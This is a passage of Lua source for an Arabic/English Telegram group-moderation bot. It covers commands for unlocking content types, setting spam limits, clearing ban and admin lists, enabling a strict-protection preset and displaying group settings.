if unmutept[2] == "tgservice" or unmutepts[2] == "الاشعارات" then
if DevAbs:get(DevProx..'bot:tgservice:jk'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock tgservice ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الاشعارات  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 61, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:tgservice:jk'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ tgservice » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الاشعارات سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "sticker" or unmutepts[2] == "الملصقات" then
if DevAbs:get(DevProx..'bot:sticker:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock sticker ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   الملصقات  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 60, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:sticker:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ sticker » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  الملصقات سابقا ✔️', 1, 'md')
end
end
end
if unmutept[2] == "fwd" or unmutepts[2] == "التوجيه" then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock fwd ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   التوجيه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:forward:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ fwd » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  التوجيه سابقا ✔️', 1, 'md')
end
end
end
end
end
------------------------------------DevProx-----------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etspam (%d+)$") then
local sensspam = {string.match(text, "^([Ss]etspam) (%d+)$")}
if tonumber(sensspam[2]) < 40 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Enter a number greater than 40 ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ اختر عدد اكبر من 40 حرف ', 1, 'md')
end
else
DevAbs:set(DevProx..'bot:sens:spam'..msg.chat_id_,sensspam[2])
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم وضع عدد الاحرف '..sensspam[2]..' \n📤┇ اذا كانت الرساله فيها اكثر من '..sensspam[2]..' حرف \n📤┇ انا سوف اقوم بحذفها ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Spam sensitivity has been set to [ ' ..sensspam[2]..' ]\n📤┇ Sentences have over '..sensspam[2]..' character will delete ', 1, 'md')
end
end
end
if text:match("^ضع عدد الاحرف (%d+)$") then
local sensspam = {string.match(text, "^(ضع عدد الاحرف) (%d+)$")}
if tonumber(sensspam[2]) < 40 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Enter a number greater than 40 ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ اختر عدد اكبر من 40 حرف ', 1, 'md')
end
else
DevAbs:set(DevProx..'bot:sens:spam'..msg.chat_id_,sensspam[2])
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم وضع عدد الاحرف '..sensspam[2]..' \n📤┇ اذا كانت الرساله فيها اكثر من '..sensspam[2]..' حرف \n🎖┇ انا سوف اقوم بحذفها ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Spam sensitivity has been set to [ ' ..sensspam[2]..' ]\n📤┇ Sentences have over '..sensspam[2]..' character will delete ', 1, 'md')
end
end
end
end     
-----------------------------------------------------------------------------------------------
if is_sudo(msg) then
if text:match("^[Ee]dit (.*)$") then
local editmsg = {string.match(text, "^([Ee]dit) (.*)$")}
edit(msg.chat_id_, msg.reply_to_message_id_, nil, editmsg[2], 1, 'html')
end
if text:match("^تعديل (.*)$") then
local editmsgs = {string.match(text, "^(تعديل) (.*)$")}
edit(msg.chat_id_, msg.reply_to_message_id_, nil,editmsgs[2], 1, 'html')
end
end
-----------------------------------------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Cc]lean (.*)$") or text:match("^حذف (.*)$") then
local txt = {string.match(text, "^([Cc]lean) (.*)$")}
local txts = {string.match(text, "^(حذف) (.*)$")}
if txt[2] == 'banlist' or txts[2] == 'المحظورين' then
DevAbs:del(DevProx..'bot:banned:'..msg.chat_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Banlist has been cleared ', 1, 'md')
else
local DevProx = '📤┇ تم حذف المحظورين  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 34, string.len(msg.sender_user_id_))
end
end
if is_sudo(msg) then 
if txt[2] == 'banalllist' or txts[2] == 'قائمه العام' then
DevAbs:del(DevProx..'bot:gban:')
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Banalllist has been cleared ', 1, 'md')
else
local DevProx = '📤┇ تم حذف قائمه العام  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 34, string.len(msg.sender_user_id_))
end
end
end
if is_leader(msg) then 
if txt[2] == 'dev3' or txts[2] == 'مطورين الرتبه الثالثه' then
DevAbs:del(DevProx..'bot:admins:')
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Banalllist has been cleared ', 1, 'md')
else
local DevProx = '📤┇ تم حذف مطورين الرتبه الثالثه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 46, string.len(msg.sender_user_id_))
end
end
end
if txts[2] == 'البوتات' then
local botslist = function(extra, result)
local list = result.members_
for i = 0, #list do
if tonumber(list[i].user_id_) ~= tonumber(bot_id) then chat_kick(msg.chat_id_,list[i].user_id_)
end 
end
end
local DevProx = '📤┇ تم حذف البوتات  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 32, string.len(msg.sender_user_id_))
getChannelMembers(msg.chat_id_, 0, "Bots", 100, botslist)
end
if txt[2] == 'modlist' or txts[2] == 'الادمنيه' then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Mod list has been cleared ', 1, 'md')
else
local DevProx = '📤┇ تم حذف الادمنيه  \n🎖┇ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 33, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:momod:'..msg.chat_id_)
end
if txt[2] == 'donky list' or txts[2] == 'المطايه' then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Mod list has been cleared ', 1, 'md')
else
local DevProx = '📤┇ تم حذف المطايه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 32, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:donky:'..msg.chat_id_)
end
if txt[2] == 'voplist' or txts[2] == 'الاعضاء المميزين' then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ VIP Members list has been cleared ', 1, 'md')
else
local DevProx = '📤┇ تم حذف الاعضاء المميزين  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 41, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:VipGroup:'..msg.chat_id_)
end
if txt[2] == 'filterlist' or txts[2] == 'قائمه المنع' then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Filterlist has been cleared ', 1, 'md')
else
local DevProx = '📤┇ تم حذف قائمه المنع  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 36, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:filters:'..msg.chat_id_)
end
if txt[2] == 'mutelist' or txts[2] == 'المكتومين' then
DevAbs:del(DevProx..'bot:muted:'..msg.chat_id_)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Muted users list has been cleared ', 1, 'md')
else
local DevProx = '📤┇ تم حذف المكتومين  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 34, string.len(msg.sender_user_id_))
end
end
end
end
if text == 'حذف الرابط' then
DevAbs:del(DevProx.."bot:group:link"..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⛔️❗️ تـۖم حـذف رابـط ٱڵمجـمۄعة ', 1, 'md')
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Cc]lean (.*)$") or text:match("^حذف (.*)$") then
local txt = {string.match(text, "^([Cc]lean) (.*)$")}
local txts = {string.match(text, "^(حذف) (.*)$")}
if txts[2] == 'قائمه المنع العام' then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Freelist has been cleared ', 1, 'md')
else
local DevProx = '📤┇ تم حذف قائمه المنع العام  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 42, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:freewords:')
end
if txt[2] == 'owners' or txts[2] == 'المدراء' then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ owner list has been cleared ', 1, 'md')
else
local DevProx = '📤┇ تم حذف المدراء  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 32, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:owners:'..msg.chat_id_)
end
if txt[2] == 'monsh' or txts[2] == 'المنشئين' then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ monsh list has been cleared ', 1, 'md')
else
local DevProx = '📤┇ تم حذف المنشئين  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 33, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:monsh:'..msg.chat_id_)
end
if txt[2] == 'momod all' or txts[2] == 'الادمنيه العامين' then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Mod all list has been cleared ', 1, 'md')
else
local DevProx = '📤┇ تم حذف الادمنيه العامين  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 41, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:moall:')
end
if txt[2] == 'vip all' or txts[2] == 'المميزين عام' then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ vip all list has been cleared ', 1, 'md')
else
local DevProx = '📤┇ تم حذف المميزين عام  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 37, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:vpall:')
end
if txt[2] == 'ownerall' or txts[2] == 'المدراء العامين' then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Mod list has been cleared ', 1, 'md')
else
local DevProx = '📤┇ تم حذف المدراء العامين  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 40, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:onall:')
end
end
end
if text:match("^حذف القوائم$") then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ هذه الخاصيه للمنشئ والرتب الاعلى منه ', 1, 'md')
else
DevAbs:del(DevProx..'bot:banned:'..msg.chat_id_)
DevAbs:del(DevProx..'bot:momod:'..msg.chat_id_)
DevAbs:del(DevProx..'bot:donky:'..msg.chat_id_)
DevAbs:del(DevProx..'bot:VipGroup:'..msg.chat_id_)
DevAbs:del(DevProx..'bot:filters:'..msg.chat_id_)
DevAbs:del(DevProx..'bot:muted:'..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '📛┇ تم حذف المحظورين \n🏆┇ تم حذف الادمنيه \n🥉┇ تم حذف المميزين \n🗑┇ تم حذف المطاية \n⚠️┇ تم حذف قائمه المنع \n🔇┇ تم حذف المكتومين \n➖➖➖➖➖➖➖➖➖➖\n🚸┇ تم حذف هذه القوائم بواسطه '..renk_DevProx(msg)..' ', 1, 'md')
end
end
if text:match("^تفعيل الحمايه القصوى$") or text:match("^قفل التفليش$") then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ هذه الخاصيه للمنشئ والرتب الاعلى منه ', 1, 'md')
else
DevAbs:set(DevProx..'bot:links:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:forward:mute'..msg.chat_id_,true)
DevAbs:del(DevProx..'lock:get:photo'..msg.chat_id_)
DevAbs:set(DevProx..'bot:bots:ban'..msg.chat_id_,true)
DevAbs:set(DevProx..'anti-flood:'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:video:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:gifs:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:sticker:mute'..msg.chat_id_,true)
DevAbs:del(DevProx.."fshar"..msg.chat_id_)
DevAbs:del(DevProx.."taf"..msg.chat_id_)
DevAbs:del(DevProx.."kaf"..msg.chat_id_)
DevAbs:set(DevProx..'floodstatus'..msg.chat_id_,'Kicked')
DevAbs:set('DevProx:id:photo'..msg.chat_id_,true)
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم تعطيل جلب الصوره \n🏆┇ تم قفل البوتات بالطرد \n♻️┇ تم قفل التكرار \n🔔┇ تم قفل الروابط \n📨┇ تم قفل التوجيه \n⏰┇ تم قفل الملصقات \n📥┇ تم قفل المتحركه \n🎥┇ تم قفل الفيديو \n📛┇ تم قفل الفشار \n🏆┇ تم قفل الكفران \n⏱┇ تم قفل الطائفيه  \n💬┇ تم وضع التكرار بالطرد \n🔔┇ تم وضع الايدي بدون صوره ➖➖➖➖➖➖➖\n🔊┇ تم تفعيل الحمايه القصوى بواسطه { '..renk_DevProx(msg)..' } ', 1, 'md')
end
end
------------------------------DevProx-----------------------------------------------------------------   
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]ettings$") or text:match("^الاعدادات$") then
if DevAbs:get(DevProx..'bot:muteall'..msg.chat_id_) then
mute_all = 'مفعل 🌟'
else
mute_all = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:text:mute'..msg.chat_id_) then
mute_text = 'مفعل 🌟'
else
mute_text = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:photo:mute'..msg.chat_id_) then
mute_photo = 'مفعل 🌟'
else
mute_photo = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:video:mute'..msg.chat_id_) then
mute_video = 'مفعل 🌟'
else
mute_video = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:gifs:mute'..msg.chat_id_) then
mute_gifs = 'مفعل 🌟'
else
mute_gifs = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
mute_flood = 'مفعل 🌟'
else
mute_flood = 'معطل 🛢'
end
------------DevProx
if not DevAbs:get(DevProx..'flood:max:'..msg.chat_id_) then
flood_m = 5
else
flood_m = DevAbs:get(DevProx..'flood:max:'..msg.chat_id_)
end
------------DevProx
if not DevAbs:get(DevProx..'bot:sens:spam'..msg.chat_id_) then
spam_c = 250
else
spam_c = DevAbs:get(DevProx..'bot:sens:spam'..msg.chat_id_)
end
------------DevProx
if DevAbs:get(DevProx..'floodstatus'..msg.chat_id_) == "DelMsg" then
floodstatus = "بالحذف ??"
elseif DevAbs:get(DevProx..'floodstatus'..msg.chat_id_) == "Kicked" then
floodstatus = "بالطرد 🛢"
elseif not DevAbs:get(DevProx..'floodstatus'..msg.chat_id_) then
floodstatus = "بالحذف 🌟"
end
----------------------------------------------------DevProx
if DevAbs:get(DevProx..'bot:music:mute'..msg.chat_id_) then
mute_music = 'مفعل 🌟'
else
mute_music = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:bots:ban'..msg.chat_id_) then
mute_bots = 'مفعل 🌟'
else
mute_bots = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:inline:mute'..msg.chat_id_) then
mute_in = 'مفعل 🌟'
else
mute_in = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:cmds'..msg.chat_id_) then
mute_cmd = 'مفعل 🌟'
else
mute_cmd = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:voice:mute'..msg.chat_id_) then
mute_voice = 'مفعل 🌟'
else
mute_voice = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'editmsg'..msg.chat_id_) then
mute_edit = 'مفعل 🌟'
else
mute_edit = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
mute_links = 'مفعل 🌟'
else
mute_links = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:pin:mute'..msg.chat_id_) then
lock_pin = 'مفعل 🌟'
else
lock_pin = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:sticker:mute'..msg.chat_id_) then
lock_sticker = 'مفعل 🌟'
else
lock_sticker = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:tgservice:jk'..msg.chat_id_) then
lock_tgservice = 'مفعل 🌟'
else
lock_tgservice = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
lock_wp = 'مفعل 🌟'
else
lock_wp = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:strict'..msg.chat_id_) then
strict = 'مفعل 🌟'
else
strict = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
lock_htag = 'مفعل 🌟'
else
lock_htag = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
lock_tag = 'مفعل 🌟'
else
lock_tag = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:location:mute'..msg.chat_id_) then
lock_location = 'مفعل 🌟'
else
lock_location = 'معطل 🚸'
end
------------DevProx
if DevAbs:get(DevProx..'bot:contact:mute'..msg.chat_id_) then
lock_contact = 'مفعل 🌟'
else
lock_contact = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
lock_english = 'مفعل 🌟'
else
lock_english = 'معطل 🛢'
end
------------fader
if DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) then
lock_arabic = 'مفعل 🌟'
else
lock_arabic = 'معطل 🛢'
end
------------fader
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
lock_forward = 'مفعل 🌟'
else
lock_forward = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:document:mute'..msg.chat_id_) then
lock_file = 'مفعل 🌟'
else
lock_file = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'markdown:lock'..msg.chat_id_) then
markdown = 'مفعل 🌟'
else
markdown = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx..'bot:spam:mute'..msg.chat_id_) then
lock_spam = 'مفعل 🌟'
else
lock_spam = 'معطل 🛢'
end
------------DevProx
if DevAbs:get(DevProx.."bot:welcome"..msg.chat_id_) then
send_welcome = 'مفعل 🌟'
else
send_welcome = 'معطل 🛢'
end
------------DevProx
local TXTAR = "🎖┇ اعدادات المجموعه 🔻 :\n\n"
.."📤┇ قفل الحمايه  "..strict.."\n"
.."📤┇ قفل الكل  "..mute_all.."\n"
.."📤┇ قفل الشارحه  "..mute_cmd.."\n\n"
.."🎖┇ اعدادات اخرى:🔻 :\n\n"
.."📤┇ قفل الكلايش  "..lock_spam.."\n"
.."📤┇ قفل الروابط  "..mute_links.."\n"
.."️📤┇ قفل الشبكات  "..lock_wp.."\n"
.."📤┇ قفل المعرف  "..lock_tag.."\n"
.."📤┇ قفل الهاشتاك  "..lock_htag.."\n"
.."📤┇ قفل التوجيه  "..lock_forward.."\n"
.."📤┇ قفل البوتات   "..mute_bots.."\n"
.."📤┇ قفل العديل   "..mute_edit.."\n"
.."📤┇ قفل التثبيت  "..lock_pin.."\n"
.."📤┇ قفل الاونلاين  "..mute_in.."\n"
.."📤┇ قفل العربيه   "..lock_arabic.."\n"
.."📤┇ قفل الانكليزيه  "..lock_english.."\n"
.."📤┇ قفل الماركداون  "..markdown.."\n"
.."️📤┇ قفل الاشعارات  "..lock_tgservice.."\n"
.."📤┇ قفل التكرار  "..mute_flood.."\n"
.."📤┇ خاصيه التكرار  "..floodstatus.."\n"
.."📤┇ عدد التكرار  [ "..flood_m.." ]\n"
.."️📤┇ عدد السبام  [ "..spam_c.." ]\n\n"
.."🎖┇ المزيد من الاعدادات 🔻 :\n\n"
.."📤┇ قفل الدردشه  "..mute_text.."\n"
.."📤┇ قفل الصور  "..mute_photo.."\n"
.."📤┇ قفل الفيديو  "..mute_video.."\n"
.."📤┇ قفل المتحركه  "..mute_gifs.."\n"
.."📤┇ قفل الاغاني  "..mute_music.."\n"
.."📤┇ قفل الصوت  "..mute_voice.."\n"
.."📤┇ قفل الملفات  "..lock_file.."\n"
.."📤┇ قفل الملصقات  "..lock_sticker.."\n"
.."📤┇ قفل الجهات  "..lock_contact.."\n"
.."️ 📤┇ قفل المواقع  "..lock_location.."\n"
local TXTEN = "⚙ Group Settings :\n\n"
.."◾️ *Strict Mode* : "..strict.."\n"
.."◾️ *Group lock All* : "..mute_all.."\n"
.."◾️ *Case of no answer* : "..mute_cmd.."\n\n"
.."⚠️ *Centerial Settings* :\n\n"
.."◾️ *Lock Spam* : "..lock_spam.."\n"
.."◾️ *Lock Links* : "..mute_links.."\n"
.."️◾️ *Lock Web-Page* :  "..lock_wp.."\n"
.."◾️ *Lock Tag* : "..lock_tag.."\n"
.."️◾️ *Lock abstag* : "..lock_htag.."\n"
.."◾️ *Lock Forward* : "..lock_forward.."\n"
.."◾️ *Lock Bots* :  "..mute_bots.."\n"
.."️◾️ *Lock Edit* :  "..mute_edit.."\n"
.."️◾️ *Lock Pin* : "..lock_pin.."\n"
.."◾️ *Lock Inline* : "..mute_in.."\n"
.."◾️ *Lock arabic* :  "..lock_arabic.."\n"
.."◾️ *Lock English* : "..lock_english.."\n"
.."◾️ *Lock MarkDown* : "..markdown.."\n"
.."️◾️ *Lock TgService* : "..lock_tgservice.."\n"
.."◾️ *Lock Flood* : "..mute_flood.."\n"
.."◾️ *Flood Status* : "..floodstatus.."\n"
.."◾️ *Flood Sensitivity* : [ "..flood_m.." ]\n"
.."️◾️ *Spam Sensitivity* : [ "..spam_c.." ]\n\n"
.." 🔇 *Media Settings* :\n\n"
.."◽️ *Lock Text* : "..mute_text.."\n"
.."◽️ *Lock Photo* : "..mute_photo.."\n"
.."◽️ *Lock Videos* : "..mute_video.."\n"
.."◽️ *Lock Gifs* : "..mute_gifs.."\n"
.."◽️ *Lock Music* : "..mute_music.."\n"
.."◽️ *Lock Voice* : "..mute_voice.."\n"
.."◽️ *Lock File* : "..lock_file.."\n"
.."◽️ *Lock Sticker* : "..lock_sticker.."\n"
.."◽️ *Lock Contact* : "..lock_contact.."\n"
.."️◽️ *Lock location* : "..lock_location.."\n"
TXTEN = TXTEN:gsub("yse✅","yse✅")
TXTEN = TXTEN:gsub("#no","'no'")
TXTEN = TXTEN:gsub("بالحذف","Deleting")
TXTEN = TXTEN:gsub("بالطرد","Kicking")
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, TXTEN, 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, TXTAR, 1, 'md')
end
end
end
---------------------------------------DevProx--------------------------------------------------------
if text:match("^كول (.*)$")  then
local txt = {string.match(text, "^(كول) (.*)$")}
Dev_Abs(msg.chat_id_,0, 1, txt[2], 1, 'md')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
-----------------
if (text and text == 'enable reply bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Enable Reply Bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تفعيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'bot:lang:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏰┇ *Reply bot is already enabled*️ ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏰┇ تم تفعيل ردود البوت سابقا ', 1, 'md')
end
else
if DevAbs:get(DevProx..'bot:lang:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏰┇ *Reply bot has been enable*️ ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏰┇ تم تفعيل ردود البوت ', 1, 'md')
DevAbs:del(DevProx..'bot:rep:mute'..msg.chat_id_)
end
end
end
if (text and text == 'disable reply bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Disable Reply Bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تعطيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'bot:lang:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏰┇ *Reply bot is already disabled*️ ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏰┇ تم تعطيل ردود البوت سابقا ', 1, 'md')
end
else
if DevAbs:get(DevProx..'bot:lang:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏰┇ *Reply bot has been disabled*️ ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏰┇ تم تعطيل ردود البوت ', 1, 'md')
DevAbs:set(DevProx..'bot:rep:mute'..msg.chat_id_,true)
end
end
end
---------------------------------------DevProx--------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etrules (.*)$") then
local txt = {string.match(text, "^([Ss]etrules) (.*)$")}
DevAbs:set(DevProx..'bot:rules'..msg.chat_id_, txt[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Group rules has been saved ', 1, 'md')
else
